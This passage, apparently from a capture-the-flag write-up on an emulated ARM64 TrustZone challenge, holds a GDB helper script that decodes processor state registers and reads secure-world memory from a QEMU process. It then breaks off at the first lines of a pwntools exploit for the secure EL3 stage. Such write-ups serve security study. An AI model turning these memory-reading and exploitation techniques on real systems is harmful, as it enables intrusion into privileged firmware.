</span></span><span style="display:flex;"><span>        mode <span style="color:#f92672">=</span> spsr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111</span>
</span></span><span style="display:flex;"><span>        is_thumb <span style="color:#f92672">=</span> (spsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        IRQ <span style="color:#f92672">=</span> (spsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">7</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        FIQ <span style="color:#f92672">=</span> (spsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">6</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        cond <span style="color:#f92672">=</span> (spsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">27</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0b11111</span>
</span></span><span style="display:flex;"><span>        state <span style="color:#f92672">=</span> (spsr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> state:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0b0000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL0t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL1h&#39;</span> <span style="color:#75715e"># SP_EL1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1001</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL2h&#39;</span> <span style="color:#75715e"># SP_EL2</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1100</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3t&#39;</span> <span style="color:#75715e"># SP_EL0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1101</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;EL3h&#39;</span> <span style="color:#75715e"># SP_EL3</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;UNK&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">0b0000</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;User&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0001</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;FIQ&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0010</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;IRQ&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0011</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Supervisor&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0110</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Monitor&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b0111</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Abort&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1010</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Hyp&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1011</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;Undefined&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">elif</span> <span style="color:#ae81ff">0b1111</span> <span style="color:#f92672">==</span> mode:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;System&#39;</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;UNK&#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> IRQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;IRQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> FIQ:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;FIQ_MASKED | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_thumb:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;THUMB_MODE | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> state:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;32-BIT | &#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            re <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;64-BIT | &#39;</span>
</span></span><span style="display:flex;"><span>        re <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;COND_</span><span style="color:#e6db74">{</span>hex(cond)[<span style="color:#ae81ff">2</span>:]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>        print(re)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">TCR_EL1</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(TCR_EL1, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;tcr_el1&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        arg <span style="color:#f92672">=</span> arg<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(arg) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            tcr <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">0</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> len(arg) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            tcr <span style="color:#f92672">=</span> int(gdb<span style="color:#f92672">.</span>parse_and_eval(<span style="color:#e6db74">&#39;$TCR_EL1&#39;</span>))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;usuage: tcr_el1 [value (optional)]&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        T0SZ <span style="color:#f92672">=</span> tcr <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0b111111</span>
</span></span><span style="display:flex;"><span>        T1SZ <span style="color:#f92672">=</span> tcr <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>        T1SZ <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0b111111</span>
</span></span><span style="display:flex;"><span>        TG1 <span style="color:#f92672">=</span> int((tcr<span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">30</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b11</span>)
</span></span><span style="display:flex;"><span>        granule_bits <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0b01</span>: <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">0b10</span>: <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">0b11</span>: <span style="color:#ae81ff">16</span>}[TG1]
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;T0:&#34;</span>,hex(<span style="color:#ae81ff">0</span>),<span style="color:#e6db74">&#39;~&#39;</span>,hex(<span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> (<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>T0SZ)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;T1:&#34;</span>,hex(<span style="color:#ae81ff">0x10000000000000000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">**</span> (<span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>T1SZ)),<span style="color:#e6db74">&#39;~&#39;</span>,hex(<span style="color:#ae81ff">0xffffffffffffffff</span>))
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;granule_bits:&#39;</span>,granule_bits)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">QEMU_SUPPORT</span>(gdb<span style="color:#f92672">.</span>Command):
</span></span><span style="display:flex;"><span>    address_space <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;cpu-memory-0&#39;</span>:{
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;system&#39;</span> : {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;hitcon.flash1&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x000000004000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x000000007ffffff</span>},
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;pl011&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x0000000009000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x0000000009000fff</span>},
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;mach-hitcon.ram&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x0000000040000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x0000000ffffffff</span>},
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        },
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;cpu-secure-memory-0&#39;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;hitcon.flash0&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x0000000000000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x0000000003ffffff</span>},
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;system&#39;</span> : {
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;hitcon.flash1&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x000000004000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x000000007ffffff</span>},
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;pl011&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x0000000009000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x0000000009000fff</span>},
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;mach-hitcon.ram&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x0000000040000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x0000000ffffffff</span>},
</span></span><span style="display:flex;"><span>            },
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;hitcon.secure-ram&#39;</span> : {<span style="color:#e6db74">&#39;start&#39;</span> : <span style="color:#ae81ff">0x000000000e000000</span>, <span style="color:#e6db74">&#39;end&#39;</span> : <span style="color:#ae81ff">0x000000000effffff</span>}
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#75715e"># monitor info mtree </span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_remote_pid</span>(proc_name):
</span></span><span style="display:flex;"><span>        pids <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> process <span style="color:#f92672">in</span> psutil<span style="color:#f92672">.</span>process_iter():
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> proc_name <span style="color:#f92672">in</span> process<span style="color:#f92672">.</span>name():
</span></span><span style="display:flex;"><span>                pids<span style="color:#f92672">.</span>append(process<span style="color:#f92672">.</span>pid)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(pids) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> pids[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(QEMU_SUPPORT, self)<span style="color:#f92672">.</span>__init__(<span style="color:#e6db74">&#34;qemu_support&#34;</span>, gdb<span style="color:#f92672">.</span>COMMAND_USER)
</span></span><span style="display:flex;"><span>        pid <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_remote_pid(<span style="color:#e6db74">&#39;qemu-system-aarch64&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> pid <span style="color:#f92672">!=</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>pid <span style="color:#f92672">=</span> pid
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_memory</span>(self, addr, length):
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>selected_inferior()<span style="color:#f92672">.</span>read_memory(addr, length)<span style="color:#f92672">.</span>tobytes()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_region_recursive</span>(self, addr):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_region_step</span>(obj, key):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">assert</span> type(obj) <span style="color:#f92672">==</span> type({})
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;start&#39;</span> <span style="color:#f92672">in</span> obj <span style="color:#f92672">and</span> <span style="color:#e6db74">&#39;end&#39;</span> <span style="color:#f92672">in</span> obj:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> addr <span style="color:#f92672">&gt;=</span> obj[<span style="color:#e6db74">&#39;start&#39;</span>] <span style="color:#f92672">and</span> addr <span style="color:#f92672">&lt;=</span> obj[<span style="color:#e6db74">&#39;end&#39;</span>]:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> key
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> obj:
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> find_region_step(obj[i], i) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">False</span>:
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> i
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (find_region_step(QEMU_SUPPORT<span style="color:#f92672">.</span>address_space, <span style="color:#e6db74">&#39;&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_phys</span>(self, addr, length):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">slow_path</span>():
</span></span><span style="display:flex;"><span>            ret <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;monitor gpa2hva </span><span style="color:#e6db74">{</span>addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, to_string<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;is (0x[0-9a-f]+)&#34;</span>, ret)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> r:
</span></span><span style="display:flex;"><span>                host_va <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>),<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;/proc/</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">/mem&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>                    f<span style="color:#f92672">.</span>seek(host_va)
</span></span><span style="display:flex;"><span>                    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read(length)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> data
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#39;Err read_phys() -&gt; slow_path()&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fast_path</span>():
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;monitor xp/</span><span style="color:#e6db74">{</span>length<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span><span style="color:#e6db74">}</span><span style="color:#e6db74">xg </span><span style="color:#e6db74">{</span>addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        reg <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>find_region_recursive(addr) <span style="color:#75715e"># secure mem or non-secure?</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> reg <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;cpu-secure-memory-0&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> slow_path()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> reg <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;cpu-memory-0&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> fast_path()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Err find_region_recursive()&#34;</span>,reg)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>       <span style="color:#75715e"># secure world can access non-secure mem as well as secure mem.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">invoke</span>(self, arg, from_tty):
</span></span><span style="display:flex;"><span>        arg <span style="color:#f92672">=</span> arg<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(arg) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> arg[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;read_phys&#39;</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> len(arg) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> arg[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;0x&#39;</span>):
</span></span><span style="display:flex;"><span>                        addr <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                        addr <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> arg[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;0x&#39;</span>):
</span></span><span style="display:flex;"><span>                        length <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                        length <span style="color:#f92672">=</span> int(arg[<span style="color:#ae81ff">2</span>],<span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>                    data <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>read_phys(addr, length<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> data <span style="color:#f92672">!=</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>                        self<span style="color:#f92672">.</span>qword_dump(data, addr,length)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;invalid args&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@staticmethod</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">qword_dump</span>(data, addr, length):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(length):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>                ad <span style="color:#f92672">=</span> hex(addr <span style="color:#f92672">+</span> i<span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>)[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">16</span>,<span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>ad<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;: &#39;</span>)
</span></span><span style="display:flex;"><span>            a <span style="color:#f92672">=</span> hex(struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, data[<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>i:<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>])[<span style="color:#ae81ff">0</span>])[<span style="color:#ae81ff">2</span>:]<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">16</span>,<span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;0x</span><span style="color:#e6db74">{</span>a<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,end <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; &#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>                print()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (length<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            print()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>QEMU_SUPPORT()
</span></span><span style="display:flex;"><span>TCR_EL1()
</span></span><span style="display:flex;"><span>CPSR()
</span></span><span style="display:flex;"><span>SPSR_EL3()
</span></span></code></pre></div><h2 id="exploit-code-s-sel3">Exploit code (S-SEL3)<a hidden class="anchor" aria-hidden="true" href="#exploit-code-s-sel3">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> keystone <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./super_hexagon/share/_bios.bin.extracted/BC010&#39;</span>)
